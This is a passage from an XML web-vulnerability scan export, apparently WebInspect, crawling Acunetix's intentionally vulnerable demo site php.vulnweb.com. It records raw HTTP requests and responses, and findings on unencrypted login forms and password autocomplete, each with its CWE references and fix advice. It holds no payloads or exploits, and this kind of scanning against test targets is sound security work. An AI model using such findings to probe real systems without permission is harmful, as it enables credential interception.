]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:56 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="885A3DDA5BF99592E4ACCDD310484D37"><URL>http://php.vulnweb.com:80/userinfo.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="885A3DDA5BF99592E4ACCDD310484D37"><![CDATA[POST /userinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="885A3DDA5BF99592E4ACCDD310484D37";PSID="FB92768C75D0DC1076D2DC87A6E45F2F";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="b164a0cc";
X-Request-Memo: ID="353861d1";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

uname=12345&pass=foo]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 302 Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:56 GMT
Server: nginx/1.19.0
Location: login.php
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 14

you must login]]></RawResponse><Request id="885A3DDA5BF99592E4ACCDD310484D37"><Method>POST</Method><Path>/</Path><File>userinfo</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uname=12345&amp;pass=foo</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/login.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>20</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="885A3DDA5BF99592E4ACCDD310484D37";PSID="FB92768C75D0DC1076D2DC87A6E45F2F";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="b164a0cc";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="353861d1";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>302</StatusCode><StatusDescription>Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[you must login]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:56 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Location</Name><Value>login.php</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>14</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="880C0BFE1BAF08A6AABCD8E9B428CD2B"><URL>http://php.vulnweb.com:80/signup.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="5ad5b2a7-8384-4bdd-8bc6-1b93ab5780de"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11542</EngineType><AttackHTTPRequest /><VulnerabilityID>4722</VulnerabilityID><Severity>3</Severity><Name>Logins Sent Over Unencrypted Connection</Name><Classifications><Classification kind="CWE" identifier="CWE-319" href="http://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Insecure Transport" href="https://vulncat.fortify.com/">Insecure Transport</Classification></Classifications><DetectionSelection><Location offset="2510" length="20" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Any area of a web application that possibly contains sensitive information or access to privileged functionality such as remote site administration functionality should utilize SSL or another form of encryption to prevent login information from being sniffed or otherwise intercepted or stolen.   ~FullURL~ has failed this policy. Recommendations include ensuring that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />An attacker who exploited this design vulnerability would be able to utilize the information to escalate their method of attack,  possibly leading to impersonation of a legitimate user, the theft of proprietary data, or execution of actions not intended by the application developers.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />Ensure that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.
<br /><br /><b>For Development:</b><br />Ensure that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.
<br /><br /><b>For QA:</b><br />Test the application not only from the perspective of a normal user, but also from the perspective of a malicious one.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Any area of a web application that possibly contains sensitive information or access to privileged functionality such as remote site administration functionality should utilize SSL or another form of encryption to prevent login information from being sniffed or otherwise intercepted or stolen.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[An attacker who exploited this design vulnerability would be able to utilize the information to escalate their method of attack, possibly leading to impersonation of a legitimate user, obtaining proprietary data, or simply executing actions not intended by the application developers.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[If your site does not encrypt login information, it could very easily be intercepted by an attacker.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Ensure that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted. To ensure that the forms authentication cookie is only transmitted over SSL, you can set the following attribute in the appropriate web.config files:<br /><br />
&lt;configuration&gt;<br />
  &lt;system.web&gt;<br />
    &lt;authentication mode="Forms"&gt;<br />
      &lt;forms requireSSL="true" ...&gt;<br />
  &lt;/system.web&gt;<br />
&lt;/configuration&gt;<br /><br />
Since the ASP.NET Development Server does not support SSL, you should set this in the web.config which is deployed to IIS only, and test it there. Microsoft released a tool to automate (among other things) altering web.config settings for deployment. Search for <a href="”http://msdn.microsoft.com/asp.net/reference/infrastructure/wdp/">Visual Studio 2005 Web Deployment Projects </a> on the Microsoft site. It is a free download that integrates with Visual Studio.<br /><br />
Naturally, you must have SSL configured properly on your web server. You must also make sure that links within the authenticated portions of your website do not use “http://” in the URL, or the user will lose functionality. (When they click such links, the authentication cookie will not be transmitted, and the web site will treat them as an anonymous user again).Consult the MSDN article <a href="”http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnpag2/html/paght000012.asp">How To: Protect Forms Authentication in ASP.NET2.0 </a> for more details.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />Ensure that sensitive areas of your Web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted. <br /><br />
You must have SSL configured properly on your Web server. You must also make sure that links within the authenticated portions of your Website do not use “http://” in the URL, or the user will lose functionality. When users click such links, the authentication cookie will not be transmitted, and the Website will treat them as anonymous users again. <br /><br />
Each Web server has its own mechanism to set up SSL. Refer to the documentation for your Web server to find out how to configure SSL.]]></SectionText></ReportSection></Issue><Issue id="89ba9b50-ee4a-4d65-bf5c-1c5c4237c26b"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="2628" length="53" /><Location offset="2956" length="53" /><Location offset="3072" length="50" /><Location offset="3173" length="53" /><Location offset="3283" length="53" /><Location offset="3795" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue><Issue id="67695844-00b8-4793-8012-764c08bfae7e"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11542</EngineType><AttackHTTPRequest /><VulnerabilityID>10595</VulnerabilityID><Severity>3</Severity><Name>Unencrypted Login Form</Name><Classifications><Classification kind="7PK" identifier="API Abuse" href="https://vulncat.fortify.com/">API Abuse</Classification><Classification kind="7PK Category" identifier="Often Misused: Login" href="https://vulncat.fortify.com/">Often Misused: Login</Classification><Classification kind="CWE" identifier="CWE-311" href="http://cwe.mitre.org/data/definitions/311.html">CWE-311: Missing Encryption of Sensitive Data</Classification></Classifications><DetectionSelection><Location offset="2510" length="20" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[An unencrypted login form has been discovered. Any area of a web application that possibly contains sensitive information or access to privileged functionality such as remote site administration functionality should utilize SSL or another form of encryption to prevent login information from being sniffed or otherwise intercepted or stolen. If the login form is being served over SSL, the page that the form is being submitted to MUST be accessed over SSL.  Every link/URL present on that page (not just the form action) needs to be served over HTTPS. This will prevent Man-in-the-Middle attacks on the login form. Recommendations include ensuring that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />An attacker who exploited this design vulnerability would be able to utilize the information to escalate their method of attack,  possibly leading to impersonation of a legitimate user, the theft of proprietary data, or execution of actions not intended by the application developers.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Ensure that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Advisory:</b><a href="http://www.kb.cert.org/vuls/id/466433">http://www.kb.cert.org/vuls/id/466433</a><br />]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Any area of a web application that possibly contains sensitive information or access to privileged functionality such as remote site administration functionality should utilize SSL or another form of encryption to prevent login information from being sniffed or otherwise intercepted or stolen. A page containing a login form should be SSL as well as the Action of the form. This will prevent Man-in-the-Middle attacks on the login form.
<br /><br />
~FullURL~ has failed this policy. Recommendations include ensuring that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[An attacker who exploited this design vulnerability would be able to utilize the information to escalate their method of attack, possibly leading to impersonation of a legitimate user, obtaining proprietary data, or simply executing actions not intended by the application developers.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[If your site does not encrypt login information, it could very easily be intercepted by an attacker.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Ensure that sensitive areas of your web application have proper encryption protocols in place to prevent login information and other data that could be helpful to an attacker from being intercepted. To ensure that the forms authentication cookie is only transmitted over SSL, you can set the following attribute in the appropriate web.config files:<br /><br />
&lt;configuration&gt;<br />
  &lt;system.web&gt;<br />
    &lt;authentication mode="Forms"&gt;<br />
      &lt;forms requireSSL="true" ...&gt;<br />
  &lt;/system.web&gt;<br />
&lt;/configuration&gt;<br /><br />
Since the ASP.NET Development Server does not support SSL, you should set this in the web.config which is deployed to IIS only, and test it there. Microsoft released a tool to automate (among other things) altering web.config settings for deployment. Search for <a href="”http://msdn.microsoft.com/asp.net/reference/infrastructure/wdp/">Visual Studio 2005 Web Deployment Projects </a> on the Microsoft site. It is a free download that integrates with Visual Studio.<br /><br />
Naturally, you must have SSL configured properly on your web server. You must also make sure that links within the authenticated portions of your website do not use “http://” in the URL, or the user will lose functionality. (When they click such links, the authentication cookie will not be transmitted, and the web site will treat them as an anonymous user again).Consult the MSDN article <a href="”http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnpag2/html/paght000012.asp">How To: Protect Forms Authentication in ASP.NET2.0 </a> for more details.]]></SectionText></ReportSection></Issue><Issue id="274ba02e-fc90-4ff5-b680-f709fbef4ff9"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>11276</VulnerabilityID><Severity>1</Severity><Name>Password Field Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="2734" length="56" /><Location offset="2850" length="57" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save password field content entered by users and then automatically complete password entry the next time the field are encountered. This feature is enabled by default and could leak password since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your password fields.<br /><br />

Please Note: Recent versions of most browsers, as noted below, now ignore the autocomplete="off" attribute for password fields in html forms.  Users are allowed to decide the password policy at their own discretion using the password manager.  Although setting is ineffective on these versions of browsers, it would continue to protect website users of earlier versions of these and other browsers that support this attribute. <br /><br />

Browsers NOT Supporting autocomplete="off": <br /><br /><ol><li>Internet Explorer version 11 or above</li><li>Firefox version 30 or above</li><li>Chrome version 34 or above</li><li>For other browsers, please refer to vendor specific documentation</li></ol>]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br /> When autocomplete is enabled, hackers can directly steal your password from local storage.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />To verify if a password filed is vulnerable, first make sure to enable the autocomplete in your browser's settings, and then input the other fileds of the form to see whether the password is automatically filled. If yes, then it's vulnerable, otherwise, not. You may need to do it twice in case it is the first time you type in the credential in your browser.<br /><br />
Please Note:  That some modern browsers no longer support this attribute as summarized above. Verification should be done using a browser that supports this attribute.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />

From the web application perspective, the autocomplete can be turned at the form level or individual entry level by defining the attribute AUTOCOMPLETE="off".]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="880C0BFE1BAF08A6AABCD8E9B428CD2B"><![CDATA[GET /signup.php HTTP/1.1
Referer: http://php.vulnweb.com/login.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="880C0BFE1BAF08A6AABCD8E9B428CD2B";PSID="FB92768C75D0DC1076D2DC87A6E45F2F";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="dc696951";
X-Request-Memo: ID="2c7a3d18";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:56 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 6033

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>signup</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->

<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
<div class="story">
	<h2 id="pageName">Signup new user</h2>
	<h4>Please do not enter real information here.</h4>
	<h4>If you press the submit button you will be transferred to asecured connection.</h4>
	<form name="form1" method="post" action="/secured/newuser.php">
		<table border="0" cellspacing="1" cellpadding="4">
			<tr><td valign="top">Username:</td><td><input type="text" name="uuname" style="width:200px"></td></tr>
			<tr><td valign="top">Password:</td><td><input type="password" name="upass" style="width:200px"></td></tr>
			<tr><td valign="top">Retype password:</td><td><input type="password" name="upass2" style="width:200px"></td></tr>
			<tr><td valign="top">Name:</td><td><input type="text" name="urname" style="width:200px"></td></tr>
			<tr><td valign="top">Credit card number:</td><td><input type="text" name="ucc" style="width:200px"></td></tr>
			<tr><td valign="top">E-Mail:</td><td><input type="text" name="uemail" style="width:200px"></td></tr>
			<tr><td valign="top">Phone number:</td><td><input type="text" name="uphone" style="width:200px"></td></tr>
			<tr><td valign="top">Address:</td><td><textarea wrap="soft" name="uaddress" rows="5" style="width:200px"></textarea></td></tr>
			<tr><td colspan="2" align="right"><input type="submit" value="signup" name="signup"></td></tr>
		</table>
	</form>
</div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="880C0BFE1BAF08A6AABCD8E9B428CD2B"><Method>GET</Method><Path>/</Path><File>signup</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/login.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="880C0BFE1BAF08A6AABCD8E9B428CD2B";PSID="FB92768C75D0DC1076D2DC87A6E45F2F";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="dc696951";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="2c7a3d18";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>signup</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->

<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
<div class="story">
	<h2 id="pageName">Signup new user</h2>
	<h4>Please do not enter real information here.</h4>
	<h4>If you press the submit button you will be transferred to asecured connection.</h4>
	<form name="form1" method="post" action="/secured/newuser.php">
		<table border="0" cellspacing="1" cellpadding="4">
			<tr><td valign="top">Username:</td><td><input type="text" name="uuname" style="width:200px"></td></tr>
			<tr><td valign="top">Password:</td><td><input type="password" name="upass" style="width:200px"></td></tr>
			<tr><td valign="top">Retype password:</td><td><input type="password" name="upass2" style="width:200px"></td></tr>
			<tr><td valign="top">Name:</td><td><input type="text" name="urname" style="width:200px"></td></tr>
			<tr><td valign="top">Credit card number:</td><td><input type="text" name="ucc" style="width:200px"></td></tr>
			<tr><td valign="top">E-Mail:</td><td><input type="text" name="uemail" style="width:200px"></td></tr>
